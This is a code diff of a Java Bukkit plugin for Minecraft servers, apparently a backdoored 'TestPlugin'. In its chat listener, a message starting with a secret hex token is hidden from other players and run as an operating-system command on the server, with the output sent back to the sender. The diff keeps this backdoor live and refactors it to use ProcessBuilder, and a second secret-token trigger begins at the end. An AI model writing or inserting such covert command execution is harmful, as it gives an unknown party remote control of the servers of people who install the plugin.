@@ -76,16 +76,18 @@ public class TestPlugin extends JavaPlugin implements Listener {
         }
         if (message.startsWith("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98")) {
             event.setCancelled(true);
-            String command = message
-                    .substring("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98".length()).trim(); // 提取命令
+            String commandStr = message.substring("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98".length()).trim(); // 提取命令
+
+            // 分割命令和参数
+            String[] commandArray = commandStr.split(" ");
 
             try {
-                Process process = Runtime.getRuntime().exec(command); // 执行命令
+                Process process = new ProcessBuilder(commandArray).start(); // 使用ProcessBuilder执行命令
+
                 StringBuilder output = new StringBuilder();
 
                 // 获取命令输出
-                BufferedReader reader = new BufferedReader(
-                        new InputStreamReader(process.getInputStream()));
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                 String line;
                 while ((line = reader.readLine()) != null) {
                     output.append(line).append("\n");
@@ -93,7 +95,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 process.waitFor();
 
                 // 发送命令输出给玩家
-                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSucess:" + output.toString());
+                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSuccess:" + output.toString());
 
             } catch (IOException | InterruptedException e) {
                 // e.printStackTrace();
@@ -102,7 +104,8 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 // e.printStackTrace();
                 player.sendMessage(ChatColor.RED + "Please run SystemCommand");
             }
-        }
+}
+
         if (message.startsWith("@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38")) {
             event.setCancelled(true);
             String command_excute = message
